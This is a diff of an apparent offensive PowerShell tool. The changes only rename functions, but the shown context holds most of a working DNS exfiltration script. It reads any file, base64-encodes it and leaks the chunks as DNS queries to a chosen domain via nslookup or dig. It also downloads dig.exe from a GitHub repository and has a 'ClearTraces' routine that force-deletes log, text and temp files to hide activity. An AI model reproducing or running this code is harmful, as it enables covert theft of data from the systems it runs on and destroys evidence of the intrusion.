@@ -77,7 +77,7 @@ param(
 )
 
 # ---------------[Functions]--------------- #
-function Write-Status {
+function WriteStatus {
     param([string]$msg, [string]$lvl="INFO")
     $stamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $color = switch ($lvl) {
@@ -91,21 +91,21 @@ function Write-Status {
     Write-Output "[$lvl] $stamp :: $msg" -ForegroundColor $color
 }
 
-function Clear-Traces {
-    Write-Status "Cleaning DNS exfiltration traces..." "STEP"
+function ClearTraces {
+    WriteStatus "Cleaning DNS exfiltration traces..." "STEP"
     $patterns = @("*.log", "*.txt", "*.tmp", "*Invoke-DNSExfiltration*.log")
     foreach ($pattern in $patterns) {
         Get-ChildItem -Path (Get-Location) -Filter $pattern -ErrorAction SilentlyContinue | ForEach-Object {
             try { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } 
             catch {
-                Write-Status "Failed to remove $_.FullName: $_" "ERROR"
+                WriteStatus "Failed to remove $_.FullName: $_" "ERROR"
             }
         }
     }
-    Write-Status "Cleanup finished." "SUCCESS"
+    WriteStatus "Cleanup finished." "SUCCESS"
     exit 0
 }
-if ($Cleanup) { Clear-Traces }
+if ($Cleanup) { ClearTraces }
 
 function Get-DigPath {
     # Look for dig.exe in the script directory
@@ -116,18 +116,18 @@ function Get-DigPath {
 
     # If not found, download from user's repo
     $repoUrl = "https://github.com/Miiraak/Scripts/raw/master/Tools/dig.exe"
-    Write-Status "dig.exe not found, downloading from $repoUrl ..." "STEP"
+    WriteStatus "dig.exe not found, downloading from $repoUrl ..." "STEP"
     try {
         Invoke-WebRequest -Uri $repoUrl -OutFile $digPath -UseBasicParsing
-        Write-Status "dig.exe downloaded to $digPath" "SUCCESS"
+        WriteStatus "dig.exe downloaded to $digPath" "SUCCESS"
         return $digPath
     } catch {
-        Write-Status "Error downloading dig.exe: $_" "ERROR"
+        WriteStatus "Error downloading dig.exe: $_" "ERROR"
         return $null
     }
 }
 
-function Invoke-DNSExfiltration {
+function InvokeDNSExfiltration {
     param(
         [string]$Data,
         [string]$Domain,
@@ -153,13 +153,13 @@ function Invoke-DNSExfiltration {
         if ($digPath) { $method = "dig" }
         else { $method = "nslookup" }
     }
-    Write-Status "DNS method used: $method" "STEALTH"
-    Write-Status "Number of queries to send: $($chunks.Count)" "EXFIL"
+    WriteStatus "DNS method used: $method" "STEALTH"
+    WriteStatus "Number of queries to send: $($chunks.Count)" "EXFIL"
     $logFile = "Invoke-DNSExfiltration-$(Get-Date -Format 'yyyyMMddHHmmss').log"
     foreach ($query in $chunks) {
-        if ($Verbose) { Write-Status "Query: $query" "STEP" }
+        if ($Verbose) { WriteStatus "Query: $query" "STEP" }
         if ($TestMode) {
-            Write-Status "[TESTMODE] $query" "EXFIL"
+            WriteStatus "[TESTMODE] $query" "EXFIL"
         } else {
             if ($method -eq "nslookup") {
                 $null = nslookup $query
@@ -177,13 +177,13 @@ try {
     $effectiveData = $Data
     if ($FilePath) {
         if (!(Test-Path $FilePath)) { throw "File to exfiltrate not found: $FilePath" }
-        Write-Status "Reading file to exfiltrate: $FilePath" "STEP"
+        WriteStatus "Reading file to exfiltrate: $FilePath" "STEP"
         $effectiveData = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
     }
     if (-not $effectiveData) { throw "No data to exfiltrate." }
-    Invoke-DNSExfiltration -Data $effectiveData -Domain $Domain -ChunkSize $ChunkSize -SleepMs $SleepMs -Verbose:$Verbose -UseDig:$UseDig -TestMode:$TestMode
+    InvokeDNSExfiltration -Data $effectiveData -Domain $Domain -ChunkSize $ChunkSize -SleepMs $SleepMs -Verbose:$Verbose -UseDig:$UseDig -TestMode:$TestMode
 } catch {
-    Write-Status "$_" "ERROR"
+    WriteStatus "$_" "ERROR"
 }
 
 # ---------------[End]--------------- #
